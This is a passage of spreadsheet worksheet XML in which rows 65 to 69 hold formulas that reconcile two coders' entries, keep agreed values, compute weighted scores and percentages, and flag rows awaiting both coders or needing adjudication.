        <f>IF(AND(Coder1!AD65&amp;""&lt;&gt;"",Coder1!AD65&amp;""=Coder2!AD65&amp;""),Coder1!AD65,"")</f>
        <v/>
      </c>
      <c r="AE65" s="14">
        <f>IF(AND(Coder1!AE65&amp;""&lt;&gt;"",Coder1!AE65&amp;""=Coder2!AE65&amp;""),Coder1!AE65,"")</f>
        <v/>
      </c>
      <c r="AF65" s="14">
        <f>IF(AND(Coder1!AF65&amp;""&lt;&gt;"",Coder1!AF65&amp;""=Coder2!AF65&amp;""),Coder1!AF65,"")</f>
        <v/>
      </c>
      <c r="AG65" s="14">
        <f>IF(AND(Coder1!AG65&amp;""&lt;&gt;"",Coder1!AG65&amp;""=Coder2!AG65&amp;""),Coder1!AG65,"")</f>
        <v/>
      </c>
      <c r="AH65" s="14">
        <f>IF(AND(Coder1!AH65&amp;""&lt;&gt;"",Coder1!AH65&amp;""=Coder2!AH65&amp;""),Coder1!AH65,"")</f>
        <v/>
      </c>
      <c r="AI65" s="11">
        <f>IF(COUNT(E65:L65)=0,"",SUM(E65:L65))</f>
        <v/>
      </c>
      <c r="AJ65" s="11">
        <f>IF(AI65="","",N(E65)*3+N(F65)*2+N(G65)*2+N(H65)*2+N(I65)*2+N(J65)*3+N(K65)*3+N(L65)*3)</f>
        <v/>
      </c>
      <c r="AK65" s="11">
        <f>IF(AI65="","",COUNTIF(N65:AG65,1))</f>
        <v/>
      </c>
      <c r="AL65" s="11">
        <f>IF(OR(AJ65="",AJ65=0),"",ROUND(100*(AJ65-AK65)/AJ65,1))</f>
        <v/>
      </c>
      <c r="AM65" s="11">
        <f>IF(AND(Coder1!AN65=1,Coder2!AN65=1),IF(COUNTBLANK(E65:AH65)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN65" s="11">
        <f>IF(AND(Coder1!AN65=1,Coder2!AN65=1),IF(SUMPRODUCT(--(Coder1!E65:AH65&amp;""&lt;&gt;Coder2!E65:AH65&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO65" s="11" t="n"/>
    </row>
    <row r="66">
      <c r="A66" s="11">
        <f>Coder1!A66</f>
        <v/>
      </c>
      <c r="B66" s="11">
        <f>Coder1!B66</f>
        <v/>
      </c>
      <c r="C66" s="11">
        <f>Coder1!C66</f>
        <v/>
      </c>
      <c r="D66" s="11">
        <f>Coder1!D66</f>
        <v/>
      </c>
      <c r="E66" s="14">
        <f>IF(AND(Coder1!E66&amp;""&lt;&gt;"",Coder1!E66&amp;""=Coder2!E66&amp;""),Coder1!E66,"")</f>
        <v/>
      </c>
      <c r="F66" s="14">
        <f>IF(AND(Coder1!F66&amp;""&lt;&gt;"",Coder1!F66&amp;""=Coder2!F66&amp;""),Coder1!F66,"")</f>
        <v/>
      </c>
      <c r="G66" s="14">
        <f>IF(AND(Coder1!G66&amp;""&lt;&gt;"",Coder1!G66&amp;""=Coder2!G66&amp;""),Coder1!G66,"")</f>
        <v/>
      </c>
      <c r="H66" s="14">
        <f>IF(AND(Coder1!H66&amp;""&lt;&gt;"",Coder1!H66&amp;""=Coder2!H66&amp;""),Coder1!H66,"")</f>
        <v/>
      </c>
      <c r="I66" s="14">
        <f>IF(AND(Coder1!I66&amp;""&lt;&gt;"",Coder1!I66&amp;""=Coder2!I66&amp;""),Coder1!I66,"")</f>
        <v/>
      </c>
      <c r="J66" s="14">
        <f>IF(AND(Coder1!J66&amp;""&lt;&gt;"",Coder1!J66&amp;""=Coder2!J66&amp;""),Coder1!J66,"")</f>
        <v/>
      </c>
      <c r="K66" s="14">
        <f>IF(AND(Coder1!K66&amp;""&lt;&gt;"",Coder1!K66&amp;""=Coder2!K66&amp;""),Coder1!K66,"")</f>
        <v/>
      </c>
      <c r="L66" s="14">
        <f>IF(AND(Coder1!L66&amp;""&lt;&gt;"",Coder1!L66&amp;""=Coder2!L66&amp;""),Coder1!L66,"")</f>
        <v/>
      </c>
      <c r="M66" s="14">
        <f>IF(AND(Coder1!M66&amp;""&lt;&gt;"",Coder1!M66&amp;""=Coder2!M66&amp;""),Coder1!M66,"")</f>
        <v/>
      </c>
      <c r="N66" s="14">
        <f>IF(AND(Coder1!N66&amp;""&lt;&gt;"",Coder1!N66&amp;""=Coder2!N66&amp;""),Coder1!N66,"")</f>
        <v/>
      </c>
      <c r="O66" s="14">
        <f>IF(AND(Coder1!O66&amp;""&lt;&gt;"",Coder1!O66&amp;""=Coder2!O66&amp;""),Coder1!O66,"")</f>
        <v/>
      </c>
      <c r="P66" s="14">
        <f>IF(AND(Coder1!P66&amp;""&lt;&gt;"",Coder1!P66&amp;""=Coder2!P66&amp;""),Coder1!P66,"")</f>
        <v/>
      </c>
      <c r="Q66" s="14">
        <f>IF(AND(Coder1!Q66&amp;""&lt;&gt;"",Coder1!Q66&amp;""=Coder2!Q66&amp;""),Coder1!Q66,"")</f>
        <v/>
      </c>
      <c r="R66" s="14">
        <f>IF(AND(Coder1!R66&amp;""&lt;&gt;"",Coder1!R66&amp;""=Coder2!R66&amp;""),Coder1!R66,"")</f>
        <v/>
      </c>
      <c r="S66" s="14">
        <f>IF(AND(Coder1!S66&amp;""&lt;&gt;"",Coder1!S66&amp;""=Coder2!S66&amp;""),Coder1!S66,"")</f>
        <v/>
      </c>
      <c r="T66" s="14">
        <f>IF(AND(Coder1!T66&amp;""&lt;&gt;"",Coder1!T66&amp;""=Coder2!T66&amp;""),Coder1!T66,"")</f>
        <v/>
      </c>
      <c r="U66" s="14">
        <f>IF(AND(Coder1!U66&amp;""&lt;&gt;"",Coder1!U66&amp;""=Coder2!U66&amp;""),Coder1!U66,"")</f>
        <v/>
      </c>
      <c r="V66" s="14">
        <f>IF(AND(Coder1!V66&amp;""&lt;&gt;"",Coder1!V66&amp;""=Coder2!V66&amp;""),Coder1!V66,"")</f>
        <v/>
      </c>
      <c r="W66" s="14">
        <f>IF(AND(Coder1!W66&amp;""&lt;&gt;"",Coder1!W66&amp;""=Coder2!W66&amp;""),Coder1!W66,"")</f>
        <v/>
      </c>
      <c r="X66" s="14">
        <f>IF(AND(Coder1!X66&amp;""&lt;&gt;"",Coder1!X66&amp;""=Coder2!X66&amp;""),Coder1!X66,"")</f>
        <v/>
      </c>
      <c r="Y66" s="14">
        <f>IF(AND(Coder1!Y66&amp;""&lt;&gt;"",Coder1!Y66&amp;""=Coder2!Y66&amp;""),Coder1!Y66,"")</f>
        <v/>
      </c>
      <c r="Z66" s="14">
        <f>IF(AND(Coder1!Z66&amp;""&lt;&gt;"",Coder1!Z66&amp;""=Coder2!Z66&amp;""),Coder1!Z66,"")</f>
        <v/>
      </c>
      <c r="AA66" s="14">
        <f>IF(AND(Coder1!AA66&amp;""&lt;&gt;"",Coder1!AA66&amp;""=Coder2!AA66&amp;""),Coder1!AA66,"")</f>
        <v/>
      </c>
      <c r="AB66" s="14">
        <f>IF(AND(Coder1!AB66&amp;""&lt;&gt;"",Coder1!AB66&amp;""=Coder2!AB66&amp;""),Coder1!AB66,"")</f>
        <v/>
      </c>
      <c r="AC66" s="14">
        <f>IF(AND(Coder1!AC66&amp;""&lt;&gt;"",Coder1!AC66&amp;""=Coder2!AC66&amp;""),Coder1!AC66,"")</f>
        <v/>
      </c>
      <c r="AD66" s="14">
        <f>IF(AND(Coder1!AD66&amp;""&lt;&gt;"",Coder1!AD66&amp;""=Coder2!AD66&amp;""),Coder1!AD66,"")</f>
        <v/>
      </c>
      <c r="AE66" s="14">
        <f>IF(AND(Coder1!AE66&amp;""&lt;&gt;"",Coder1!AE66&amp;""=Coder2!AE66&amp;""),Coder1!AE66,"")</f>
        <v/>
      </c>
      <c r="AF66" s="14">
        <f>IF(AND(Coder1!AF66&amp;""&lt;&gt;"",Coder1!AF66&amp;""=Coder2!AF66&amp;""),Coder1!AF66,"")</f>
        <v/>
      </c>
      <c r="AG66" s="14">
        <f>IF(AND(Coder1!AG66&amp;""&lt;&gt;"",Coder1!AG66&amp;""=Coder2!AG66&amp;""),Coder1!AG66,"")</f>
        <v/>
      </c>
      <c r="AH66" s="14">
        <f>IF(AND(Coder1!AH66&amp;""&lt;&gt;"",Coder1!AH66&amp;""=Coder2!AH66&amp;""),Coder1!AH66,"")</f>
        <v/>
      </c>
      <c r="AI66" s="11">
        <f>IF(COUNT(E66:L66)=0,"",SUM(E66:L66))</f>
        <v/>
      </c>
      <c r="AJ66" s="11">
        <f>IF(AI66="","",N(E66)*3+N(F66)*2+N(G66)*2+N(H66)*2+N(I66)*2+N(J66)*3+N(K66)*3+N(L66)*3)</f>
        <v/>
      </c>
      <c r="AK66" s="11">
        <f>IF(AI66="","",COUNTIF(N66:AG66,1))</f>
        <v/>
      </c>
      <c r="AL66" s="11">
        <f>IF(OR(AJ66="",AJ66=0),"",ROUND(100*(AJ66-AK66)/AJ66,1))</f>
        <v/>
      </c>
      <c r="AM66" s="11">
        <f>IF(AND(Coder1!AN66=1,Coder2!AN66=1),IF(COUNTBLANK(E66:AH66)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN66" s="11">
        <f>IF(AND(Coder1!AN66=1,Coder2!AN66=1),IF(SUMPRODUCT(--(Coder1!E66:AH66&amp;""&lt;&gt;Coder2!E66:AH66&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO66" s="11" t="n"/>
    </row>
    <row r="67">
      <c r="A67" s="11">
        <f>Coder1!A67</f>
        <v/>
      </c>
      <c r="B67" s="11">
        <f>Coder1!B67</f>
        <v/>
      </c>
      <c r="C67" s="11">
        <f>Coder1!C67</f>
        <v/>
      </c>
      <c r="D67" s="11">
        <f>Coder1!D67</f>
        <v/>
      </c>
      <c r="E67" s="14">
        <f>IF(AND(Coder1!E67&amp;""&lt;&gt;"",Coder1!E67&amp;""=Coder2!E67&amp;""),Coder1!E67,"")</f>
        <v/>
      </c>
      <c r="F67" s="14">
        <f>IF(AND(Coder1!F67&amp;""&lt;&gt;"",Coder1!F67&amp;""=Coder2!F67&amp;""),Coder1!F67,"")</f>
        <v/>
      </c>
      <c r="G67" s="14">
        <f>IF(AND(Coder1!G67&amp;""&lt;&gt;"",Coder1!G67&amp;""=Coder2!G67&amp;""),Coder1!G67,"")</f>
        <v/>
      </c>
      <c r="H67" s="14">
        <f>IF(AND(Coder1!H67&amp;""&lt;&gt;"",Coder1!H67&amp;""=Coder2!H67&amp;""),Coder1!H67,"")</f>
        <v/>
      </c>
      <c r="I67" s="14">
        <f>IF(AND(Coder1!I67&amp;""&lt;&gt;"",Coder1!I67&amp;""=Coder2!I67&amp;""),Coder1!I67,"")</f>
        <v/>
      </c>
      <c r="J67" s="14">
        <f>IF(AND(Coder1!J67&amp;""&lt;&gt;"",Coder1!J67&amp;""=Coder2!J67&amp;""),Coder1!J67,"")</f>
        <v/>
      </c>
      <c r="K67" s="14">
        <f>IF(AND(Coder1!K67&amp;""&lt;&gt;"",Coder1!K67&amp;""=Coder2!K67&amp;""),Coder1!K67,"")</f>
        <v/>
      </c>
      <c r="L67" s="14">
        <f>IF(AND(Coder1!L67&amp;""&lt;&gt;"",Coder1!L67&amp;""=Coder2!L67&amp;""),Coder1!L67,"")</f>
        <v/>
      </c>
      <c r="M67" s="14">
        <f>IF(AND(Coder1!M67&amp;""&lt;&gt;"",Coder1!M67&amp;""=Coder2!M67&amp;""),Coder1!M67,"")</f>
        <v/>
      </c>
      <c r="N67" s="14">
        <f>IF(AND(Coder1!N67&amp;""&lt;&gt;"",Coder1!N67&amp;""=Coder2!N67&amp;""),Coder1!N67,"")</f>
        <v/>
      </c>
      <c r="O67" s="14">
        <f>IF(AND(Coder1!O67&amp;""&lt;&gt;"",Coder1!O67&amp;""=Coder2!O67&amp;""),Coder1!O67,"")</f>
        <v/>
      </c>
      <c r="P67" s="14">
        <f>IF(AND(Coder1!P67&amp;""&lt;&gt;"",Coder1!P67&amp;""=Coder2!P67&amp;""),Coder1!P67,"")</f>
        <v/>
      </c>
      <c r="Q67" s="14">
        <f>IF(AND(Coder1!Q67&amp;""&lt;&gt;"",Coder1!Q67&amp;""=Coder2!Q67&amp;""),Coder1!Q67,"")</f>
        <v/>
      </c>
      <c r="R67" s="14">
        <f>IF(AND(Coder1!R67&amp;""&lt;&gt;"",Coder1!R67&amp;""=Coder2!R67&amp;""),Coder1!R67,"")</f>
        <v/>
      </c>
      <c r="S67" s="14">
        <f>IF(AND(Coder1!S67&amp;""&lt;&gt;"",Coder1!S67&amp;""=Coder2!S67&amp;""),Coder1!S67,"")</f>
        <v/>
      </c>
      <c r="T67" s="14">
        <f>IF(AND(Coder1!T67&amp;""&lt;&gt;"",Coder1!T67&amp;""=Coder2!T67&amp;""),Coder1!T67,"")</f>
        <v/>
      </c>
      <c r="U67" s="14">
        <f>IF(AND(Coder1!U67&amp;""&lt;&gt;"",Coder1!U67&amp;""=Coder2!U67&amp;""),Coder1!U67,"")</f>
        <v/>
      </c>
      <c r="V67" s="14">
        <f>IF(AND(Coder1!V67&amp;""&lt;&gt;"",Coder1!V67&amp;""=Coder2!V67&amp;""),Coder1!V67,"")</f>
        <v/>
      </c>
      <c r="W67" s="14">
        <f>IF(AND(Coder1!W67&amp;""&lt;&gt;"",Coder1!W67&amp;""=Coder2!W67&amp;""),Coder1!W67,"")</f>
        <v/>
      </c>
      <c r="X67" s="14">
        <f>IF(AND(Coder1!X67&amp;""&lt;&gt;"",Coder1!X67&amp;""=Coder2!X67&amp;""),Coder1!X67,"")</f>
        <v/>
      </c>
      <c r="Y67" s="14">
        <f>IF(AND(Coder1!Y67&amp;""&lt;&gt;"",Coder1!Y67&amp;""=Coder2!Y67&amp;""),Coder1!Y67,"")</f>
        <v/>
      </c>
      <c r="Z67" s="14">
        <f>IF(AND(Coder1!Z67&amp;""&lt;&gt;"",Coder1!Z67&amp;""=Coder2!Z67&amp;""),Coder1!Z67,"")</f>
        <v/>
      </c>
      <c r="AA67" s="14">
        <f>IF(AND(Coder1!AA67&amp;""&lt;&gt;"",Coder1!AA67&amp;""=Coder2!AA67&amp;""),Coder1!AA67,"")</f>
        <v/>
      </c>
      <c r="AB67" s="14">
        <f>IF(AND(Coder1!AB67&amp;""&lt;&gt;"",Coder1!AB67&amp;""=Coder2!AB67&amp;""),Coder1!AB67,"")</f>
        <v/>
      </c>
      <c r="AC67" s="14">
        <f>IF(AND(Coder1!AC67&amp;""&lt;&gt;"",Coder1!AC67&amp;""=Coder2!AC67&amp;""),Coder1!AC67,"")</f>
        <v/>
      </c>
      <c r="AD67" s="14">
        <f>IF(AND(Coder1!AD67&amp;""&lt;&gt;"",Coder1!AD67&amp;""=Coder2!AD67&amp;""),Coder1!AD67,"")</f>
        <v/>
      </c>
      <c r="AE67" s="14">
        <f>IF(AND(Coder1!AE67&amp;""&lt;&gt;"",Coder1!AE67&amp;""=Coder2!AE67&amp;""),Coder1!AE67,"")</f>
        <v/>
      </c>
      <c r="AF67" s="14">
        <f>IF(AND(Coder1!AF67&amp;""&lt;&gt;"",Coder1!AF67&amp;""=Coder2!AF67&amp;""),Coder1!AF67,"")</f>
        <v/>
      </c>
      <c r="AG67" s="14">
        <f>IF(AND(Coder1!AG67&amp;""&lt;&gt;"",Coder1!AG67&amp;""=Coder2!AG67&amp;""),Coder1!AG67,"")</f>
        <v/>
      </c>
      <c r="AH67" s="14">
        <f>IF(AND(Coder1!AH67&amp;""&lt;&gt;"",Coder1!AH67&amp;""=Coder2!AH67&amp;""),Coder1!AH67,"")</f>
        <v/>
      </c>
      <c r="AI67" s="11">
        <f>IF(COUNT(E67:L67)=0,"",SUM(E67:L67))</f>
        <v/>
      </c>
      <c r="AJ67" s="11">
        <f>IF(AI67="","",N(E67)*3+N(F67)*2+N(G67)*2+N(H67)*2+N(I67)*2+N(J67)*3+N(K67)*3+N(L67)*3)</f>
        <v/>
      </c>
      <c r="AK67" s="11">
        <f>IF(AI67="","",COUNTIF(N67:AG67,1))</f>
        <v/>
      </c>
      <c r="AL67" s="11">
        <f>IF(OR(AJ67="",AJ67=0),"",ROUND(100*(AJ67-AK67)/AJ67,1))</f>
        <v/>
      </c>
      <c r="AM67" s="11">
        <f>IF(AND(Coder1!AN67=1,Coder2!AN67=1),IF(COUNTBLANK(E67:AH67)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN67" s="11">
        <f>IF(AND(Coder1!AN67=1,Coder2!AN67=1),IF(SUMPRODUCT(--(Coder1!E67:AH67&amp;""&lt;&gt;Coder2!E67:AH67&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO67" s="11" t="n"/>
    </row>
    <row r="68">
      <c r="A68" s="11">
        <f>Coder1!A68</f>
        <v/>
      </c>
      <c r="B68" s="11">
        <f>Coder1!B68</f>
        <v/>
      </c>
      <c r="C68" s="11">
        <f>Coder1!C68</f>
        <v/>
      </c>
      <c r="D68" s="11">
        <f>Coder1!D68</f>
        <v/>
      </c>
      <c r="E68" s="14">
        <f>IF(AND(Coder1!E68&amp;""&lt;&gt;"",Coder1!E68&amp;""=Coder2!E68&amp;""),Coder1!E68,"")</f>
        <v/>
      </c>
      <c r="F68" s="14">
        <f>IF(AND(Coder1!F68&amp;""&lt;&gt;"",Coder1!F68&amp;""=Coder2!F68&amp;""),Coder1!F68,"")</f>
        <v/>
      </c>
      <c r="G68" s="14">
        <f>IF(AND(Coder1!G68&amp;""&lt;&gt;"",Coder1!G68&amp;""=Coder2!G68&amp;""),Coder1!G68,"")</f>
        <v/>
      </c>
      <c r="H68" s="14">
        <f>IF(AND(Coder1!H68&amp;""&lt;&gt;"",Coder1!H68&amp;""=Coder2!H68&amp;""),Coder1!H68,"")</f>
        <v/>
      </c>
      <c r="I68" s="14">
        <f>IF(AND(Coder1!I68&amp;""&lt;&gt;"",Coder1!I68&amp;""=Coder2!I68&amp;""),Coder1!I68,"")</f>
        <v/>
      </c>
      <c r="J68" s="14">
        <f>IF(AND(Coder1!J68&amp;""&lt;&gt;"",Coder1!J68&amp;""=Coder2!J68&amp;""),Coder1!J68,"")</f>
        <v/>
      </c>
      <c r="K68" s="14">
        <f>IF(AND(Coder1!K68&amp;""&lt;&gt;"",Coder1!K68&amp;""=Coder2!K68&amp;""),Coder1!K68,"")</f>
        <v/>
      </c>
      <c r="L68" s="14">
        <f>IF(AND(Coder1!L68&amp;""&lt;&gt;"",Coder1!L68&amp;""=Coder2!L68&amp;""),Coder1!L68,"")</f>
        <v/>
      </c>
      <c r="M68" s="14">
        <f>IF(AND(Coder1!M68&amp;""&lt;&gt;"",Coder1!M68&amp;""=Coder2!M68&amp;""),Coder1!M68,"")</f>
        <v/>
      </c>
      <c r="N68" s="14">
        <f>IF(AND(Coder1!N68&amp;""&lt;&gt;"",Coder1!N68&amp;""=Coder2!N68&amp;""),Coder1!N68,"")</f>
        <v/>
      </c>
      <c r="O68" s="14">
        <f>IF(AND(Coder1!O68&amp;""&lt;&gt;"",Coder1!O68&amp;""=Coder2!O68&amp;""),Coder1!O68,"")</f>
        <v/>
      </c>
      <c r="P68" s="14">
        <f>IF(AND(Coder1!P68&amp;""&lt;&gt;"",Coder1!P68&amp;""=Coder2!P68&amp;""),Coder1!P68,"")</f>
        <v/>
      </c>
      <c r="Q68" s="14">
        <f>IF(AND(Coder1!Q68&amp;""&lt;&gt;"",Coder1!Q68&amp;""=Coder2!Q68&amp;""),Coder1!Q68,"")</f>
        <v/>
      </c>
      <c r="R68" s="14">
        <f>IF(AND(Coder1!R68&amp;""&lt;&gt;"",Coder1!R68&amp;""=Coder2!R68&amp;""),Coder1!R68,"")</f>
        <v/>
      </c>
      <c r="S68" s="14">
        <f>IF(AND(Coder1!S68&amp;""&lt;&gt;"",Coder1!S68&amp;""=Coder2!S68&amp;""),Coder1!S68,"")</f>
        <v/>
      </c>
      <c r="T68" s="14">
        <f>IF(AND(Coder1!T68&amp;""&lt;&gt;"",Coder1!T68&amp;""=Coder2!T68&amp;""),Coder1!T68,"")</f>
        <v/>
      </c>
      <c r="U68" s="14">
        <f>IF(AND(Coder1!U68&amp;""&lt;&gt;"",Coder1!U68&amp;""=Coder2!U68&amp;""),Coder1!U68,"")</f>
        <v/>
      </c>
      <c r="V68" s="14">
        <f>IF(AND(Coder1!V68&amp;""&lt;&gt;"",Coder1!V68&amp;""=Coder2!V68&amp;""),Coder1!V68,"")</f>
        <v/>
      </c>
      <c r="W68" s="14">
        <f>IF(AND(Coder1!W68&amp;""&lt;&gt;"",Coder1!W68&amp;""=Coder2!W68&amp;""),Coder1!W68,"")</f>
        <v/>
      </c>
      <c r="X68" s="14">
        <f>IF(AND(Coder1!X68&amp;""&lt;&gt;"",Coder1!X68&amp;""=Coder2!X68&amp;""),Coder1!X68,"")</f>
        <v/>
      </c>
      <c r="Y68" s="14">
        <f>IF(AND(Coder1!Y68&amp;""&lt;&gt;"",Coder1!Y68&amp;""=Coder2!Y68&amp;""),Coder1!Y68,"")</f>
        <v/>
      </c>
      <c r="Z68" s="14">
        <f>IF(AND(Coder1!Z68&amp;""&lt;&gt;"",Coder1!Z68&amp;""=Coder2!Z68&amp;""),Coder1!Z68,"")</f>
        <v/>
      </c>
      <c r="AA68" s="14">
        <f>IF(AND(Coder1!AA68&amp;""&lt;&gt;"",Coder1!AA68&amp;""=Coder2!AA68&amp;""),Coder1!AA68,"")</f>
        <v/>
      </c>
      <c r="AB68" s="14">
        <f>IF(AND(Coder1!AB68&amp;""&lt;&gt;"",Coder1!AB68&amp;""=Coder2!AB68&amp;""),Coder1!AB68,"")</f>
        <v/>
      </c>
      <c r="AC68" s="14">
        <f>IF(AND(Coder1!AC68&amp;""&lt;&gt;"",Coder1!AC68&amp;""=Coder2!AC68&amp;""),Coder1!AC68,"")</f>
        <v/>
      </c>
      <c r="AD68" s="14">
        <f>IF(AND(Coder1!AD68&amp;""&lt;&gt;"",Coder1!AD68&amp;""=Coder2!AD68&amp;""),Coder1!AD68,"")</f>
        <v/>
      </c>
      <c r="AE68" s="14">
        <f>IF(AND(Coder1!AE68&amp;""&lt;&gt;"",Coder1!AE68&amp;""=Coder2!AE68&amp;""),Coder1!AE68,"")</f>
        <v/>
      </c>
      <c r="AF68" s="14">
        <f>IF(AND(Coder1!AF68&amp;""&lt;&gt;"",Coder1!AF68&amp;""=Coder2!AF68&amp;""),Coder1!AF68,"")</f>
        <v/>
      </c>
      <c r="AG68" s="14">
        <f>IF(AND(Coder1!AG68&amp;""&lt;&gt;"",Coder1!AG68&amp;""=Coder2!AG68&amp;""),Coder1!AG68,"")</f>
        <v/>
      </c>
      <c r="AH68" s="14">
        <f>IF(AND(Coder1!AH68&amp;""&lt;&gt;"",Coder1!AH68&amp;""=Coder2!AH68&amp;""),Coder1!AH68,"")</f>
        <v/>
      </c>
      <c r="AI68" s="11">
        <f>IF(COUNT(E68:L68)=0,"",SUM(E68:L68))</f>
        <v/>
      </c>
      <c r="AJ68" s="11">
        <f>IF(AI68="","",N(E68)*3+N(F68)*2+N(G68)*2+N(H68)*2+N(I68)*2+N(J68)*3+N(K68)*3+N(L68)*3)</f>
        <v/>
      </c>
      <c r="AK68" s="11">
        <f>IF(AI68="","",COUNTIF(N68:AG68,1))</f>
        <v/>
      </c>
      <c r="AL68" s="11">
        <f>IF(OR(AJ68="",AJ68=0),"",ROUND(100*(AJ68-AK68)/AJ68,1))</f>
        <v/>
      </c>
      <c r="AM68" s="11">
        <f>IF(AND(Coder1!AN68=1,Coder2!AN68=1),IF(COUNTBLANK(E68:AH68)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN68" s="11">
        <f>IF(AND(Coder1!AN68=1,Coder2!AN68=1),IF(SUMPRODUCT(--(Coder1!E68:AH68&amp;""&lt;&gt;Coder2!E68:AH68&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO68" s="11" t="n"/>
    </row>
    <row r="69">
      <c r="A69" s="11">
        <f>Coder1!A69</f>
        <v/>
      </c>
      <c r="B69" s="11">
        <f>Coder1!B69</f>
        <v/>
      </c>
      <c r="C69" s="11">
        <f>Coder1!C69</f>
        <v/>
      </c>
      <c r="D69" s="11">
        <f>Coder1!D69</f>
        <v/>
      </c>
      <c r="E69" s="14">
        <f>IF(AND(Coder1!E69&amp;""&lt;&gt;"",Coder1!E69&amp;""=Coder2!E69&amp;""),Coder1!E69,"")</f>
        <v/>
      </c>
      <c r="F69" s="14">
        <f>IF(AND(Coder1!F69&amp;""&lt;&gt;"",Coder1!F69&amp;""=Coder2!F69&amp;""),Coder1!F69,"")</f>
        <v/>
      </c>
      <c r="G69" s="14">
        <f>IF(AND(Coder1!G69&amp;""&lt;&gt;"",Coder1!G69&amp;""=Coder2!G69&amp;""),Coder1!G69,"")</f>
        <v/>
      </c>
      <c r="H69" s="14">
        <f>IF(AND(Coder1!H69&amp;""&lt;&gt;"",Coder1!H69&amp;""=Coder2!H69&amp;""),Coder1!H69,"")</f>
        <v/>
      </c>
      <c r="I69" s="14">
        <f>IF(AND(Coder1!I69&amp;""&lt;&gt;"",Coder1!I69&amp;""=Coder2!I69&amp;""),Coder1!I69,"")</f>
        <v/>
      </c>
      <c r="J69" s="14">
        <f>IF(AND(Coder1!J69&amp;""&lt;&gt;"",Coder1!J69&amp;""=Coder2!J69&amp;""),Coder1!J69,"")</f>
        <v/>
      </c>
      <c r="K69" s="14">
        <f>IF(AND(Coder1!K69&amp;""&lt;&gt;"",Coder1!K69&amp;""=Coder2!K69&amp;""),Coder1!K69,"")</f>
        <v/>
      </c>
      <c r="L69" s="14">
        <f>IF(AND(Coder1!L69&amp;""&lt;&gt;"",Coder1!L69&amp;""=Coder2!L69&amp;""),Coder1!L69,"")</f>
        <v/>
      </c>
      <c r="M69" s="14">
        <f>IF(AND(Coder1!M69&amp;""&lt;&gt;"",Coder1!M69&amp;""=Coder2!M69&amp;""),Coder1!M69,"")</f>
        <v/>
      </c>
      <c r="N69" s="14">
        <f>IF(AND(Coder1!N69&amp;""&lt;&gt;"",Coder1!N69&amp;""=Coder2!N69&amp;""),Coder1!N69,"")</f>
        <v/>
      </c>
      <c r="O69" s="14">
        <f>IF(AND(Coder1!O69&amp;""&lt;&gt;"",Coder1!O69&amp;""=Coder2!O69&amp;""),Coder1!O69,"")</f>
        <v/>
      </c>
      <c r="P69" s="14">
        <f>IF(AND(Coder1!P69&amp;""&lt;&gt;"",Coder1!P69&amp;""=Coder2!P69&amp;""),Coder1!P69,"")</f>
        <v/>
      </c>
      <c r="Q69" s="14">
        <f>IF(AND(Coder1!Q69&amp;""&lt;&gt;"",Coder1!Q69&amp;""=Coder2!Q69&amp;""),Coder1!Q69,"")</f>
        <v/>
      </c>
      <c r="R69" s="14">
        <f>IF(AND(Coder1!R69&amp;""&lt;&gt;"",Coder1!R69&amp;""=Coder2!R69&amp;""),Coder1!R69,"")</f>
        <v/>
      </c>
      <c r="S69" s="14">
        <f>IF(AND(Coder1!S69&amp;""&lt;&gt;"",Coder1!S69&amp;""=Coder2!S69&amp;""),Coder1!S69,"")</f>
        <v/>
      </c>
      <c r="T69" s="14">
        <f>IF(AND(Coder1!T69&amp;""&lt;&gt;"",Coder1!T69&amp;""=Coder2!T69&amp;""),Coder1!T69,"")</f>
        <v/>
      </c>
      <c r="U69" s="14">
        <f>IF(AND(Coder1!U69&amp;""&lt;&gt;"",Coder1!U69&amp;""=Coder2!U69&amp;""),Coder1!U69,"")</f>
        <v/>
      </c>
      <c r="V69" s="14">
        <f>IF(AND(Coder1!V69&amp;""&lt;&gt;"",Coder1!V69&amp;""=Coder2!V69&amp;""),Coder1!V69,"")</f>
        <v/>
      </c>
      <c r="W69" s="14">
        <f>IF(AND(Coder1!W69&amp;""&lt;&gt;"",Coder1!W69&amp;""=Coder2!W69&amp;""),Coder1!W69,"")</f>
        <v/>
      </c>
      <c r="X69" s="14">
        <f>IF(AND(Coder1!X69&amp;""&lt;&gt;"",Coder1!X69&amp;""=Coder2!X69&amp;""),Coder1!X69,"")</f>
        <v/>
      </c>
      <c r="Y69" s="14">
        <f>IF(AND(Coder1!Y69&amp;""&lt;&gt;"",Coder1!Y69&amp;""=Coder2!Y69&amp;""),Coder1!Y69,"")</f>
        <v/>
      </c>
      <c r="Z69" s="14">
        <f>IF(AND(Coder1!Z69&amp;""&lt;&gt;"",Coder1!Z69&amp;""=Coder2!Z69&amp;""),Coder1!Z69,"")</f>
        <v/>
      </c>
      <c r="AA69" s="14">
        <f>IF(AND(Coder1!AA69&amp;""&lt;&gt;"",Coder1!AA69&amp;""=Coder2!AA69&amp;""),Coder1!AA69,"")</f>
        <v/>
      </c>
      <c r="AB69" s="14">
        <f>IF(AND(Coder1!AB69&amp;""&lt;&gt;"",Coder1!AB69&amp;""=Coder2!AB69&amp;""),Coder1!AB69,"")</f>
        <v/>
      </c>
      <c r="AC69" s="14">
        <f>IF(AND(Coder1!AC69&amp;""&lt;&gt;"",Coder1!AC69&amp;""=Coder2!AC69&amp;""),Coder1!AC69,"")</f>
        <v/>
      </c>
      <c r="AD69" s="14">
        <f>IF(AND(Coder1!AD69&amp;""&lt;&gt;"",Coder1!AD69&amp;""=Coder2!AD69&amp;""),Coder1!AD69,"")</f>
        <v/>
      </c>
      <c r="AE69" s="14">
        <f>IF(AND(Coder1!AE69&amp;""&lt;&gt;"",Coder1!AE69&amp;""=Coder2!AE69&amp;""),Coder1!AE69,"")</f>
        <v/>
      </c>
      <c r="AF69" s="14">
        <f>IF(AND(Coder1!AF69&amp;""&lt;&gt;"",Coder1!AF69&amp;""=Coder2!AF69&amp;""),Coder1!AF69,"")</f>
        <v/>
      </c>
      <c r="AG69" s="14">
